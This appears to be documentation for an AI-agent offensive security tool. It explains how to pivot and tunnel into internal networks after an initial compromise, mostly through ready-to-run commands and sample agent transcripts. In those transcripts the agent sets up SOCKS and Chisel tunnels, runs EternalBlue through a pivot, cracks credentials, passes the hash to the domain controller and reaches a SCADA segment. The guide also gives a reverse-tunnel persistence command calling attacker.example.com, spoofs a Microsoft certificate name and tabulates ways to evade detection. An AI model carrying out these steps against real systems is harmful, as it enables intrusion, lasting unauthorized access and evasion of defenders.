# UniVex — Tunneling & Pivoting Guide

> **v3.0.0 NEW** — Full tunneling and pivoting toolkit for internal network access after initial compromise.

---

## Overview

After gaining initial access to a target system, penetration testers and red teamers often need to access internal network segments that are not directly reachable from the attacker's machine. **Pivoting** routes attack traffic through compromised hosts, while **tunneling** encapsulates that traffic through protocols that traverse firewalls.

UniVex v3.0 provides a complete pivoting toolkit with 6 dedicated tools:

| Tool | Method | Best For |
|------|--------|---------|
| `SOCKSProxyTool` | SSH dynamic port forwarding | General access via SSH |
| `PortForwardTool` | SSH local/remote forwarding | Specific port access |
| `ChiselTool` | HTTP-tunneled SOCKS | Bypassing egress firewalls |
| `ProxychainsTool` | Proxy chain routing | Routing any command through pivot |
| `SSHTunnelManagerTool` | Multi-hop SSH tunnels | Complex network topologies |
| `NetworkPivotMapTool` | Network visualization | Planning pivot paths |

---

## Network Topology Concepts

```
Attacker Machine (10.0.0.1)
        │
        │ (internet / VPN)
        ▼
┌─────────────────────────────────┐
│  DMZ (192.168.1.0/24)           │
│                                 │
│  Pivot 1: WEB01 (192.168.1.50) ─┼── Shell / SSH access
│           10.10.10.50 (dual NIC)│
└─────────────────────────────────┘
        │ (internal routing)
        ▼
┌─────────────────────────────────┐
│  Internal (10.10.10.0/24)       │
│                                 │
│  DC01     (10.10.10.100) — AD   │
│  FILE01   (10.10.10.101)        │
│  DB01     (10.10.10.102) — SQL  │
└─────────────────────────────────┘
        │ (further segmented)
        ▼
┌─────────────────────────────────┐
│  Restricted (172.16.0.0/24)     │
│                                 │
│  SCADA01  (172.16.0.10)         │
│  DB-PROD  (172.16.0.20)         │
└─────────────────────────────────┘
```

The goal: reach 10.10.10.0/24 and 172.16.0.0/24 from the attacker machine via pivots.

---

## SOCKS5 Proxy via SSH

The simplest and most reliable pivoting method when you have SSH access to a pivot host.

### Basic SOCKS5 Setup

```
User: Create a SOCKS5 proxy through WEB01 at 192.168.1.50

Agent: [SOCKSProxyTool]: Creating SOCKS5 proxy...
       SSH user: operator
       SSH key: /home/attacker/.ssh/id_rsa
       Local SOCKS port: 1080
       
       Running: ssh -D 1080 -N -f operator@192.168.1.50
       
       ✅ SOCKS5 proxy running on localhost:1080
       
       Configure proxychains.conf:
       socks5 127.0.0.1 1080
       
       Or set env vars:
       export ALL_PROXY=socks5://127.0.0.1:1080
```

### Using the SOCKS Proxy

```bash
# Proxychains routes any command through the SOCKS proxy
proxychains4 nmap -sT -p 80,443,445,3389 10.10.10.0/24

# curl through SOCKS
curl --socks5 127.0.0.1:1080 http://10.10.10.100

# Metasploit
msf6 > setg Proxies socks5:127.0.0.1:1080
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 10.10.10.101
msf6 > run
```

### Via AI Agent

```
User: Scan the 10.10.10.0/24 network through the pivot on WEB01

Agent: [SOCKSProxyTool]: Establishing SOCKS5 proxy via WEB01...
       ✅ Proxy running on localhost:1080
       
       [PortScanTool]: Scanning via proxychains...
       Hosts discovered: DC01 (10.10.10.100), FILE01 (10.10.10.101), DB01 (10.10.10.102)
       
       Open ports:
       DC01:  88, 135, 139, 389, 445, 464, 636, 3268, 3389
       FILE01: 445, 139, 3389
       DB01:  1433, 3389
```

---

## SSH Port Forwarding

For access to specific services on internal hosts.

### Local Port Forwarding (Access internal service locally)

```
User: Forward the RDP port on DC01 (10.10.10.100:3389) to my local machine

Agent: [PortForwardTool]: Creating local port forward...
       Command: ssh -L 13389:10.10.10.100:3389 operator@192.168.1.50 -N -f
       
       ✅ Forward active: localhost:13389 → 10.10.10.100:3389 via WEB01
       
       Connect with: rdesktop localhost:13389
       Or: xfreerdp /v:localhost:13389 /u:Administrator
```

### Remote Port Forwarding (Expose attacker service to pivot host)

```
User: Forward my local C2 listener (port 4444) to WEB01 so it's accessible from the internal network

Agent: [PortForwardTool]: Creating remote port forward...
       Command: ssh -R 4444:localhost:4444 operator@192.168.1.50 -N -f
       
       ✅ WEB01 now listening on :4444 → attacker:4444
       
       Internal hosts connecting to WEB01:4444 will reach your C2 listener.
```

---

## Chisel — HTTP-Tunneled SOCKS (Firewall Bypass)

When SSH is blocked by egress firewalls, Chisel tunnels SOCKS5 through HTTP/HTTPS — it looks like normal web traffic.

### Architecture

```
Attacker ← HTTP/HTTPS → Pivot Host (Chisel server)
            port 443       ↓
                      Internal Network
```

### Setting Up Chisel

```
User: Set up a Chisel tunnel through WEB01 to bypass the egress firewall

Agent: [ChiselTool]: Configuring Chisel tunnel...
       
       Step 1: Upload Chisel server to WEB01
       [+] Uploading chisel_linux_amd64 to /tmp/chisel (via existing shell)
       
       Step 2: Start Chisel server on WEB01
       WEB01$ /tmp/chisel server -p 443 --reverse --socks5 &
       [+] Chisel server running on WEB01:443
       
       Step 3: Connect from attacker machine
       [+] Running: chisel client 192.168.1.50:443 R:socks
       [+] Connected to WEB01:443
       
       ✅ SOCKS5 proxy available on localhost:1080
       
       Traffic path: Attacker → HTTPS/443 → WEB01:443 → Internal network
```

### Chisel with TLS (Avoid plaintext detection)

```bash
# Generate self-signed cert on WEB01
openssl req -x509 -nodes -newkey rsa:2048 -keyout /tmp/server.key -out /tmp/server.crt -days 365 -subj "/CN=updates.microsoft.com"

# Start TLS server
/tmp/chisel server -p 443 --reverse --socks5 --tls-cert /tmp/server.crt --tls-key /tmp/server.key

# Connect (attacker side, skip cert verification)
chisel client --tls-skip-verify https://192.168.1.50:443 R:socks
```

---

## Multi-Hop SSH Tunneling

For reaching multiple network segments through multiple pivot hosts.

### Two-Hop Setup

```
Attacker → WEB01 → DB01 → SCADA01
```

```
User: Set up a two-hop tunnel through WEB01 to reach SCADA01 at 172.16.0.10

Agent: [SSHTunnelManagerTool]: Creating multi-hop tunnel...
       
       Hop 1: attacker → WEB01 (192.168.1.50)
       Command: ssh -L 10022:10.10.10.50:22 operator@192.168.1.50 -N -f
       ✅ Port 10022 → internal SSH on 10.10.10.50
       
       Hop 2: through WEB01 → internal jump host
       Command: ssh -L 20022:172.16.0.10:22 operator@localhost:10022 -N -f
       ✅ Port 20022 → SCADA01 SSH
       
       SOCKS on hop 2:
       Command: ssh -D 2080 operator@localhost:20022 -N -f
       ✅ SOCKS5 proxy on localhost:2080 → 172.16.0.0/24
       
       Tunnel map:
       localhost:2080 (SOCKS)
       └── localhost:10022 (WEB01 SSH proxy)
           └── 10.10.10.50 (WEB01)
               └── 172.16.0.10 (SCADA01)
```

### SSH ProxyJump (Modern, cleaner)

```bash
# ~/.ssh/config entry (generated by SSHTunnelManagerTool)
Host pivot1
    HostName 192.168.1.50
    User operator
    IdentityFile ~/.ssh/id_rsa
    DynamicForward 1080  # SOCKS to 192.168.1.0/24

Host internal
    HostName 10.10.10.100
    User administrator
    ProxyJump pivot1     # Route through pivot1

Host scada
    HostName 172.16.0.10
    User admin
    ProxyJump internal   # Route through internal → pivot1
```

---

## Proxychains — Route Any Command Through Pivot

Proxychains transparently routes any TCP connection through configured SOCKS/HTTP proxies without modifying the target application.

### Configure Proxychains

```
User: Configure proxychains to use the SOCKS proxy on localhost:1080

Agent: [ProxychainsTool]: Configuring /etc/proxychains4.conf...
       
       [ProxyList]
       socks5 127.0.0.1 1080
       
       ✅ Proxychains configured for localhost:1080 (SOCKS5)
```

### Use Proxychains

```bash
# Nmap through pivot (TCP connect scan only — SYN scan won't work via SOCKS)
proxychains4 nmap -sT -Pn -p 80,443,8080,8443,3389 10.10.10.100

# SMB enumeration
proxychains4 crackmapexec smb 10.10.10.0/24

# Web requests
proxychains4 curl -s http://10.10.10.101/

# Metasploit module
proxychains4 msfconsole

# Custom Python script
proxychains4 python3 exploit.py --target 10.10.10.100

# BloodHound collection through pivot
proxychains4 SharpHound.exe -d CORP.LOCAL --CollectionMethods All
```

### Dynamic Chain (Multiple proxies)

```
[ProxyList]
# Route through pivot1 then pivot2
socks5 127.0.0.1 1080   # First hop (WEB01)
socks5 127.0.0.1 2080   # Second hop (internal host)
```

---

## Network Pivot Mapping

Before pivoting, map the internal network to plan your attack path.

```
User: Map all reachable networks from WEB01

Agent: [NetworkPivotMapTool]: Discovering internal networks...
       
       Network interfaces on WEB01:
       - eth0: 192.168.1.50/24 (DMZ)
       - eth1: 10.10.10.50/24 (Internal)
       
       Hosts found in 10.10.10.0/24: 15
       Hosts found in 10.10.11.0/24: 0
       Hosts found in 172.16.0.0/24: 3 (unreachable directly — need second hop)
       
       Pivot map saved to neo4j (PivotPath nodes)
       
       Recommended path to 172.16.0.0/24:
       Attacker → WEB01 (10.10.10.50) → DB01 (10.10.10.102) → 172.16.0.0/24
```

---

## AutoChain: Internal Pentest Template

The `internal_pentest` AutoChain template automates the full internal network pivot workflow:

```
User: Run internal_pentest against 192.168.1.50 (initial access) targeting 10.10.10.0/24

Agent: [AutoChain]: Starting internal_pentest template...

       Step 1/10: Host discovery (DMZ) .............. ✅ WEB01 reachable via SSH
       Step 2/10: Interface enumeration .............. ✅ Dual-homed: 192.168.1.50, 10.10.10.50
       Step 3/10: SOCKS5 pivot setup ................. ✅ Proxy on localhost:1080
       Step 4/10: Internal host discovery ............ ✅ 15 hosts in 10.10.10.0/24
       Step 5/10: Internal port scanning ............. ✅ DC01, FILE01, DB01 mapped
       Step 6/10: Service fingerprinting ............. ✅ AD, IIS, MSSQL detected
       Step 7/10: Credential attacks ................. ✅ svc.backup:Password123! cracked
       Step 8/10: Initial internal access ............ ✅ Shell on FILE01
       Step 9/10: Lateral movement ................... ✅ Shell on DC01 (via PtH)
       Step 10/10: Report generation ................. ✅ Internal_Pentest_Report.pdf

       🎯 Internal network compromised. 12 hosts owned.
```

---

## Persistence via Reverse Tunnels

Maintain access even if the initial connection drops.

```bash
# Reverse SOCKS tunnel (pivot connects TO attacker)
# On WEB01:
chisel client attacker.example.com:443 R:socks

# On attacker:
chisel server -p 443 --reverse --socks5

# Now attacker has SOCKS5 on localhost:1080 even through NAT/firewall
```

---

## Anti-Detection Considerations

| Technique | Detection Risk | Mitigation |
|-----------|---------------|------------|
| SSH SOCKS | Low — looks like normal SSH | Use authorized SSH keys, avoid banner modification |
| Chisel | Medium — unusual HTTP keepalive patterns | Route through port 80/443, use TLS, blend with normal traffic |
| Proxychains | Low — only affects attacker commands | No traffic generated on pivot itself |
| SSH port forward | Low — encrypted in SSH stream | Same as above |
| Multi-hop | Medium — multiple SSH sessions | Space out connection times, use -T flag |

---

## Environment Configuration

```bash
# .env settings for pivoting tools
# No special env vars required — pivoting tools use SSH keys and credentials
# provided at runtime via the AI agent interface.

# Optional: default SSH key for pivot operations
PIVOT_SSH_KEY_PATH=/home/runner/.ssh/id_rsa
PIVOT_DEFAULT_USER=operator

# Proxychains configuration
PROXYCHAINS_CONF=/etc/proxychains4.conf
```

---

## Troubleshooting

### SOCKS tunnel drops after inactivity

Add SSH keepalive settings:
```bash
ssh -D 1080 -N -o ServerAliveInterval=60 -o ServerAliveCountMax=3 operator@192.168.1.50
```

### Nmap SYN scan not working through proxychains

SYN scan requires raw socket privileges and does not work through SOCKS. Use TCP connect scan:
```bash
proxychains4 nmap -sT -Pn 10.10.10.0/24  # TCP connect (works via SOCKS)
```

### Chisel connection refused

Ensure Chisel server is running and the port is reachable:
```bash
curl -v http://192.168.1.50:443/health
```

### Proxychains returns "connection timeout"

The SOCKS proxy may not be running. Check:
```bash
curl --socks5 127.0.0.1:1080 http://10.10.10.100
```

---

## See Also

- [AD Attack Guide](AD_ATTACK_GUIDE.md) — Use pivoting to access AD environments
- [Proxy Guide](PROXY_GUIDE.md) — HTTP proxy for web application testing via pivot
- [Architecture](ARCHITECTURE.md) — Worker node distributed execution
